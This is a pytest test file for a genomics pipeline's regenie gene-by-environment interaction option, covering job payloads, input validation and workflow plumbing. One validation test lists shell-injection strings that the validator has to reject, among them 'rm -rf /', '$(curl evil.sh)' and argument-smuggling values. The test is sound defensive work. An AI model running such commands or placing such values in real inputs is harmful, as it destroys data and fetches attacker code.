"""Tests for GxE interaction testing in step2 singles (regenie ``--interaction``).

The interacting variable must be a column of each cohort's *covariate* file — fedcat
never reads those (individual-level data), so the option is validated for shape only
and a missing column surfaces as a regenie failure.

Run with::

    pytest regenie_workflows/federated_analysis/fedcat/tests/test_interaction.py -v
"""

from __future__ import annotations

import asyncio
import json
import weakref
from pathlib import Path

import pytest

from fedcat.core.engine import DiscoveryRun
from fedcat.core.job import Job
from fedcat.core.structures import BioBank
from fedcat.tests.test_autodetect_and_overwrite import _make_cfg

_REPO = Path(__file__).resolve().parents[3]
_WDL = _REPO / "aou_regenie_workflows" / "wdls" / "regenie_step2_single_variants_aou.wdl"
_APPLET = _REPO / "ukb_regenie_apps" / "regenie_step2_single_variants"
_SHARED_SCRIPT = _REPO / "shared_resources" / "run_regenie_step2_single_variants.sh"


def _job_inputs(cfg, biobank: BioBank, op: str, tmp_path) -> dict[str, object]:
    """Build one step2 job's submission payload, keyed by its bare input name."""
    disc = DiscoveryRun(
        config=cfg, run_path=cfg.discovery_run_path, variant_density_blockfile=tmp_path / "blocks.tsv"
    )
    recipe = (
        {"op": op, "units": [[0, "eur", "1", "1", "1000"]]}
        if biobank is BioBank.AOU
        else {"op": op, "stratum": "eur", "block": ["1", "1", "1000", "None"]}
    )
    job = Job(biobank=biobank, description=op, recipe=recipe)
    job._parent = weakref.ref(disc)
    disc.jobs = [job]
    asyncio.run(job.generate_input())
    return {k.rsplit(".", 1)[-1]: v for k, v in job.input_dict.items()}


# ── job payloads ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize("biobank", [BioBank.AOU, BioBank.UKB])
def test_interaction_reaches_step2_singles_jobs(biobank, tmp_path):
    cfg = _make_cfg(local_run_path=str(tmp_path), interaction="BMI")
    assert _job_inputs(cfg, biobank, "step2_singles", tmp_path)["interaction"] == "BMI"


@pytest.mark.parametrize("biobank", [BioBank.AOU, BioBank.UKB])
def test_payload_is_unchanged_when_no_interaction_is_configured(biobank, tmp_path):
    """Unset means the input is absent, so runs stay compatible with older workflows."""
    cfg = _make_cfg(local_run_path=str(tmp_path))
    assert "interaction" not in _job_inputs(cfg, biobank, "step2_singles", tmp_path)


@pytest.mark.parametrize("biobank", [BioBank.AOU, BioBank.UKB])
def test_aggregates_jobs_never_carry_the_interaction(biobank, tmp_path):
    """Scope is single variants; the aggregate workflows take no interaction input."""
    cfg = _make_cfg(local_run_path=str(tmp_path), interaction="BMI")
    assert "interaction" not in _job_inputs(cfg, biobank, "step2_agg", tmp_path)


def test_categorical_baseline_level_is_passed_through(tmp_path):
    cfg = _make_cfg(local_run_path=str(tmp_path), interaction="SMOKING[never]")
    inputs = _job_inputs(cfg, BioBank.AOU, "step2_singles", tmp_path)
    assert inputs["interaction"] == "SMOKING[never]"


# ── validation ────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("value", ["BMI", "BMI_2", "pheno.1", "SMOKING[never]", "BMI[<25]", "AGE[40-50]"])
def test_validate_accepts_column_names(value, tmp_path):
    _make_cfg(local_run_path=str(tmp_path), interaction=value).validate()


@pytest.mark.parametrize(
    "value",
    [
        "BMI; rm -rf /",
        "$(curl evil.sh)",
        "`id`",
        'BMI" --out /tmp/x "',
        "BMI --pred other.list",
        "BMI\nSMOKING",
        "two words",
    ],
)
def test_validate_rejects_anything_shell_shaped(value, tmp_path):
    """The value is interpolated into the task shell, so it is checked before submission."""
    with pytest.raises(ValueError, match="interaction"):
        _make_cfg(local_run_path=str(tmp_path), interaction=value).validate()


# ── workflow plumbing ─────────────────────────────────────────────────────────


def test_wdl_declares_and_forwards_the_interaction_input():
    if not _WDL.is_file():
        pytest.skip("AoU WDLs not available")
    wdl = _WDL.read_text()
    assert wdl.count('String interaction = ""') == 2  # workflow input and task input
    assert "interaction = interaction," in wdl  # passed to the task
    assert '"~{interaction}"' in wdl  # reaches the script


def test_applet_declares_the_interaction_input():
    if not _APPLET.is_dir():
        pytest.skip("UKB applets not available")
    spec = json.loads((_APPLET / "dxapp.json").read_text())
    entry = next(i for i in spec["inputSpec"] if i["name"] == "interaction")
    assert entry["optional"] and entry["default"] == "" and entry["class"] == "string"
    assert "${interaction}" in (_APPLET / "src" / "regenie_step2_single_variants.sh").read_text()


def test_shared_script_adds_the_regenie_flag_and_defaults_to_off():
    if not _SHARED_SCRIPT.is_file():
        pytest.skip("shared scripts not available")
    script = _SHARED_SCRIPT.read_text()
    # Optional 14th argument: the conditioning callers pass 13 and must keep working.
    assert "interaction=${14:-}" in script
    assert "--interaction ${interaction}" in script
